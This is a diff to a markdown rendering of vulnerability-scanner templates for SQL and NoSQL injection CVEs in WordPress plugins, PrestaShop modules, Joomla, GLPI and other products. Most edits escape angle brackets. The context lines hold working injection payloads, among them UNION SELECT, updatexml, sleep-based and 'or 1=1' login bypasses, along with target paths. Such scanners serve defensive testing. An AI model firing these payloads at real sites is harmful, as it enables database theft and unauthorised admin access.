@@ -80,7 +80,7 @@
 
 **Type - word**
 - words
-    1. <script>window.location.href='home.php'</script>
+    1. \<script>window.location.href='home.php'\</script>
 - part - body
 
 **Type - word**
@@ -936,7 +936,7 @@ requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND 
     1. 200
 
 ---
-# YesWiki <2022-07-07 - SQL Injection
+# YesWiki \<2022-07-07 - SQL Injection
 ## Description
 - YesWiki before 2022-07-07 contains a SQL injection vulnerability via the id parameter in the AccueiL URL. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
 
@@ -1176,7 +1176,7 @@ account=admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1
     1. 200
 
 ---
-# Agentejo Cockpit <0.12.0 - NoSQL Injection
+# Agentejo Cockpit \<0.12.0 - NoSQL Injection
 ## Description
 - Agentejo Cockpit prior to 0.12.0 is vulnerable to NoSQL Injection via the newpassword method of the Auth controller, which is responsible for displaying the user password reset form.
 - severity - critical
@@ -1314,7 +1314,7 @@ Host: {{Hostname}}
 - condition - or
 
 ---
-# WordPress PayPal Pro <1.1.65 - SQL Injection
+# WordPress PayPal Pro \<1.1.65 - SQL Injection
 ## Description
 - WordPress PayPal Pro plugin before 1.1.65 is susceptible to SQL injection via the 'query' parameter which allows for any unauthenticated user to perform SQL queries with the results output to a web page in JSON format.
 - severity - critical
@@ -1399,7 +1399,7 @@ searchdata='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCA
     1. 200
 
 ---
-# Agentejo Cockpit < 0.11.2 - NoSQL Injection
+# Agentejo Cockpit \< 0.11.2 - NoSQL Injection
 ## Description
 - Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php check function. The $eq operator matches documents where the value of a field equals the specified value.
 - severity - critical
@@ -1462,7 +1462,7 @@ searchdata='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCA
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{num}}),5,6,7,8,9%23
+- {{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a\<>nd%201=2%20un\<>ion%20sel\<>ect%201,2,3,md5({{num}}),5,6,7,8,9%23
 ### Matchers
 
 **Type - word**
@@ -1517,7 +1517,7 @@ btn_forgot=1&email=1%27%20or%20sleep(6)%23
 - part - body
 - words
     1. SQL STATEMENT:
-    2. <TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')</TD>
+    2. \<TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;-- -')\</TD>
 - condition - and
 
 **Type - word**
@@ -1531,7 +1531,7 @@ btn_forgot=1&email=1%27%20or%20sleep(6)%23
     1. 200
 
 ---
-# PrestaShop ProductComments < 4.2.0 - SQL Injection
+# PrestaShop ProductComments \< 4.2.0 - SQL Injection
 ## Description
 - In the PrestaShop module "productcomments" before version 4.2.1, an attacker can use a Blind SQL injection to retrieve data or stop the MySQL service. The problem is fixed in 4.2.1 of the module.
 
@@ -1556,7 +1556,7 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# Agentejo Cockpit <0.11.2 - NoSQL Injection
+# Agentejo Cockpit \<0.11.2 - NoSQL Injection
 ## Description
 - Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php resetpassword function of the Auth controller.
 - severity - critical
@@ -1601,7 +1601,7 @@ Host: {{Hostname}}
 - part - body
 
 ---
-# rConfig <=3.9.4 - SQL Injection
+# rConfig \<=3.9.4 - SQL Injection
 ## Description
 - rConfig 3.9.4 and prior has unauthenticated snippets.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
 - severity - critical
@@ -1726,8 +1726,8 @@ Host: {{Hostname}}
 - dsl
     1. status_code_1 == 302 && status_code_2 == 200 && status_code_3 == 200
     2. contains(body_2, "[zm_gallery id=")
-    3. contains(body_2, "<th scope=\"row\" class=\"check-column\">")
-    4. !contains(body_3, "<th scope=\"row\" class=\"check-column\">")
+    3. contains(body_2, "\<th scope=\"row\" class=\"check-column\">")
+    4. !contains(body_3, "\<th scope=\"row\" class=\"check-column\">")
 - condition - and
 
 ---
@@ -1779,7 +1779,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Joomla! <3.7.1 - SQL Injection
+# Joomla! \<3.7.1 - SQL Injection
 ## Description
 - Joomla! before 3.7.1 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
 
@@ -1797,7 +1797,7 @@ Host: {{Hostname}}
     1. {{md5(num)}}
 
 ---
-# Subrion CMS <4.1.5.10 - SQL Injection
+# Subrion CMS \<4.1.5.10 - SQL Injection
 ## Description
 - Subrion CMS before 4.1.5.10 has a SQL injection vulnerability in /front/search.php via the $_GET array.
 - severity - critical
@@ -1978,7 +1978,7 @@ action=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL
 - part - body
 
 ---
-# WordPress Visitor Statistics (Real Time Traffic) <4.8 -SQL Injection
+# WordPress Visitor Statistics (Real Time Traffic) \<4.8 -SQL Injection
 ## Description
 - WordPress Visitor Statistics (Real Time Traffic) plugin before 4.8 does not properly sanitize and escape the refUrl in the refDetails AJAX action, which is available to any authenticated user. This could allow users with a role as low as subscriber to perform SQL injection attacks.
 - severity - high
@@ -2064,9 +2064,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# PrestaShop SmartBlog <4.0.6- SQL Injection
+# PrestaShop SmartBlog \<4.0.6- SQL Injection
 ## Description
-- PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL injection vulnerability in the blog archive functionality.
+- PrestaShop SmartBlog by SmartDataSoft \< 4.0.6 is vulnerable to a SQL injection vulnerability in the blog archive functionality.
 - severity - critical
 - tags - cve,cve2021,prestashop,smartblog,sqli
 ## Requests
@@ -2200,7 +2200,7 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# WordPress Perfect Survey<1.5.2 - SQL Injection
+# WordPress Perfect Survey\<1.5.2 - SQL Injection
 ## Description
 - Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.
 
@@ -2256,7 +2256,7 @@ Host: {{Hostname}}
     1. RosarioSIS=
 
 ---
-# WordPress Statistics <13.0.8 - Blind SQL Injection
+# WordPress Statistics \<13.0.8 - Blind SQL Injection
 ## Description
 - WordPress Statistic plugin versions prior to version 13.0.8 are affected by an unauthenticated time-based blind SQL injection vulnerability.
 - severity - high
@@ -2278,7 +2278,7 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. compare_versions(version, '< 13.0.8')
+    1. compare_versions(version, '\< 13.0.8')
 ### Extractors
 
 **Type - regex**
@@ -2294,7 +2294,7 @@ Host: {{Hostname}}
     1. (?m)Stable tag: ([0-9.]+)
 
 ---
-# Virtua Software Cobranca <12R - Blind SQL Injection
+# Virtua Software Cobranca \<12R - Blind SQL Injection
 ## Description
 - Virtua Cobranca before 12R allows blind SQL injection on the login page.
 
@@ -2371,7 +2371,7 @@ idusuario=''&idsenha=a&tipousr=Usuario
     1. 200
 
 ---
-# Rocket.Chat <=3.13 - NoSQL Injection
+# Rocket.Chat \<=3.13 - NoSQL Injection
 ## Description
 - Rocket.Chat 3.11, 3.12 and 3.13 contains a NoSQL injection vulnerability which allows unauthenticated access to an API endpoint. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
 - severity - critical
@@ -2404,7 +2404,7 @@ Content-Type: application/json
     1. 200
 
 ---
-# PrestaHome Blog for PrestaShop <1.7.8 - SQL Injection
+# PrestaHome Blog for PrestaShop \<1.7.8 - SQL Injection
 ## Description
 - PrestaHome Blog for PrestaShop prior to version 1.7.8 is vulnerable to a SQL injection (blind) via the sb_category parameter.
 - severity - high
@@ -2464,9 +2464,12 @@ student_id=updatexml(0x23,concat(1,md5({{num}})),1)&button=Save&TRANSFER[SCHOOL]
 
 **Type - dsl**
 - dsl
-    1. contains(body_2, "<!-- SQL STATEMENT:") && contains(body_2, "SELECT COUNT(STUDENT_ID)")
+    1. contains(body_2, "\<!-- SQL STATEMENT:") && contains(body_2, "SELECT COUNT(STUDENT_ID)")
     2. status_code_2 == 200
 - condition - and
+
+**Payloads**- username
+- password
 
 ---
 # Oracle Fusion Middleware WebCenter Sites 12.2.1.3.0 - SQL Injection
@@ -2512,7 +2515,7 @@ _authkey_={{authkey}}&pagename=OpenMarket%2FXcelerate%2FAdmin%2FWebReferences&op
     1. NAME='_authkey_' VALUE='([0-9A-Z]+)'>
 
 ---
-# WordPress Google Maps <7.11.18 - SQL Injection
+# WordPress Google Maps \<7.11.18 - SQL Injection
 ## Description
 - WordPress Google Maps plugin before 7.11.18 contains a SQL injection vulnerability. The plugin includes /class.rest-api.php in the REST API and does not sanitize field names before a SELECT statement. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
 
@@ -2542,9 +2545,9 @@ _authkey_={{authkey}}&pagename=OpenMarket%2FXcelerate%2FAdmin%2FWebReferences&op
     1. 200
 
 ---
-# Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection
+# Teclib GLPI \<= 9.3.3 - Unauthenticated SQL Injection
 ## Description
-- Teclib GLPI <= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that incorrectly sanitizes user controlled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records.
+- Teclib GLPI \<= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that incorrectly sanitizes user controlled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records.
 - severity - critical
 - tags - cve,cve2019,glpi,sqli,injection
 ## Requests
@@ -2689,7 +2692,7 @@ fromEmailInvite=1&customerTID=unpossible'+UNION+SELECT+0,0,0,11132*379123,0,0,0,
     1. 200
 
 ---
-# WP Fundraising Donation and Crowdfunding Platform < 1.5.0 - Unauthenticated SQLi
+# WP Fundraising Donation and Crowdfunding Platform \< 1.5.0 - Unauthenticated SQLi
 ## Description
 - The WP Fundraising Donation and Crowdfunding Platform WordPress plugin before 1.5.0 does not sanitise and escape a parameter before using it in a SQL statement via one of it's REST route, leading to an SQL injection exploitable by unauthenticated users.
 
@@ -2717,7 +2720,7 @@ Content-Type: application/json
 - condition - and
 
 ---
-# WordPress RSVPMaker <=9.3.2 - SQL Injection
+# WordPress RSVPMaker \<=9.3.2 - SQL Injection
 ## Description
 - WordPress RSVPMaker plugin through 9.3.2 contains a SQL injection vulnerability due to insufficient escaping and parameterization on user-supplied data passed to multiple SQL queries in ~/rsvpmaker-email.php. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
 
@@ -2812,7 +2815,7 @@ username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27
 **Type - word**
 - part - body
 - words
-    1. <title>Doctor  | Dashboard</title>
+    1. \<title>Doctor  | Dashboard\</title>
     2. View Appointment History
 - condition - and
 
@@ -2821,7 +2824,7 @@ username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27
     1. 200
 
 ---
-# WordPress TI WooCommerce Wishlist <1.40.1 - SQL Injection
+# WordPress TI WooCommerce Wishlist \<1.40.1 - SQL Injection
 ## Description
 - WordPress TI WooCommerce Wishlist plugin before 1.40.1 contains a SQL injection vulnerability. The plugin does not sanitize and escape the item_id parameter before using it in a SQL statement via the wishlist/remove_product REST endpoint.
 
@@ -2903,7 +2906,7 @@ thispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains
     1. {{md5({{num}})}}
 
 ---
-# NotificationX WordPress plugin < 2.3.9 - SQL Injection
+# NotificationX WordPress plugin \< 2.3.9 - SQL Injection
 ## Description
 - The NotificationX WordPress plugin before 2.3.9 does not sanitise and escape the nx_id parameter before using it in a SQL statement, leading to an Unauthenticated Blind SQL Injection.
 
@@ -2991,7 +2994,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Nirweb Support <2.8.2 - SQL Injection
+# WordPress Nirweb Support \<2.8.2 - SQL Injection
 ## Description
 - WordPress Nirweb support plugin before 2.8.2 contains a SQL injection vulnerability. The plugin does not sanitize and escape a parameter before using it in a SQL statement via an AJAX action. An attacker can possibly obtain sensitive information from a database, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
 
@@ -3019,7 +3022,7 @@ action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NUL
     1. 200
 
 ---
-# Pricing Deals for WooCommerce < 2.0.3 - Unauthenticated SQL Injection
+# Pricing Deals for WooCommerce \< 2.0.3 - Unauthenticated SQL Injection
 ## Description
 - The Pricing Deals for WooCommerce WordPress plugin through 2.0.2.02 does not properly sanitise and escape a parameter before using it in a SQL statement via an AJAX action available to unauthenticated users, leading to an unauthenticated SQL injection.
 
@@ -3112,7 +3115,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Daily Prayer Time < 2022.03.01 - Unauthenticated SQLi
+# Daily Prayer Time \< 2022.03.01 - Unauthenticated SQLi
 ## Description
 - The Daily Prayer Time WordPress plugin before 2022.03.01 does not sanitise and escape the month parameter before using it in a SQL statement via the get_monthly_timetable AJAX action (available to unauthenticated users), leading to an unauthenticated SQL injection.
 
@@ -3229,7 +3232,7 @@ username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27
 **Type - word**
 - part - body
 - words
-    1. <title>Admin  | Dashboard</title>
+    1. \<title>Admin  | Dashboard\</title>
     2. Manage Patients
     3. Manage Doctors
 - condition - and
@@ -3293,7 +3296,7 @@ Host: {{Hostname}}
 - words
     1. Fatal error
     2. Uncaught Error: Call to a member function fetch_assoc()
-    3. <th class="">Month of</th>
+    3. \<th class="">Month of\</th>
 - condition - and
 
 **Type - word**
@@ -3340,7 +3343,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Terraboard < 2.2.0 - SQL Injection
+# Terraboard \< 2.2.0 - SQL Injection
 ## Description
 - SQL Injection in GitHub repository camptocamp/terraboard prior to 2.2.0.
 
@@ -3372,9 +3375,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WP Visitor Statistics (Real Time Traffic) < 5.8 - Unauthenticated SQLi
+# WP Visitor Statistics (Real Time Traffic) \< 5.8 - Unauthenticated SQLi
 ## Description
-- Unauthenticated SQL Injection (SQLi) vulnerabilities in Osamaesh WP Visitor Statistics plugin <= 5.7 at WordPress.
+- Unauthenticated SQL Injection (SQLi) vulnerabilities in Osamaesh WP Visitor Statistics plugin \<= 5.7 at WordPress.
 
 - severity - critical
 - tags - cve,cve2022,wordpress,wp-plugin,wp,unauth,sqli,wp-stats-manager
@@ -3517,7 +3520,7 @@ Host: {{Hostname}}
     1. {{md5({{num}})}}
 
 ---
-# BadgeOS < 3.7.1 - Unauthenticated SQL Injection
+# BadgeOS \< 3.7.1 - Unauthenticated SQL Injection
 ## Description
 - The BadgeOS WordPress plugin through 3.7.0 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action, leading to an SQL Injection exploitable by unauthenticated users.
 
@@ -3544,9 +3547,9 @@ action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(
 - condition - and
 
 ---
-# Page Views Count < 2.4.15 - Unauthenticated SQL Injection
+# Page Views Count \< 2.4.15 - Unauthenticated SQL Injection
 ## Description
-- Unauthenticated SQL Injection in WordPress Page Views Count Plugin (versions < 2.4.15).
+- Unauthenticated SQL Injection in WordPress Page Views Count Plugin (versions \< 2.4.15).
 
 - severity - critical
 - tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,unauth
@@ -3652,8 +3655,8 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <title>Add Product</title>
-    2. <span>Admin
+    1. \<title>Add Product\</title>
+    2. \<span>Admin
     3. DFSMS
 - condition - and
 
@@ -3662,7 +3665,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# ARPrice Lite < 3.6.1 - Unauthenticated SQLi
+# ARPrice Lite \< 3.6.1 - Unauthenticated SQLi
 ## Description
 - The Pricing Table WordPress plugin before 3.6.1 fails to properly sanitize and escape user supplied POST data before it is being interpolated in an SQL statement and then executed via an AJAX action available to unauthenticated users.
 
@@ -3717,7 +3720,7 @@ username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27
 **Type - word**
 - part - body
 - words
-    1. <title>User  | Dashboard</title>
+    1. \<title>User  | Dashboard\</title>
     2. Book My Appointment
 - condition - and
 
@@ -3776,7 +3779,7 @@ username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27
 
 **Type - word**
 - words
-    1. <title>SQLiteManager</title>
+    1. \<title>SQLiteManager\</title>
 
 **Type - status**
 - status
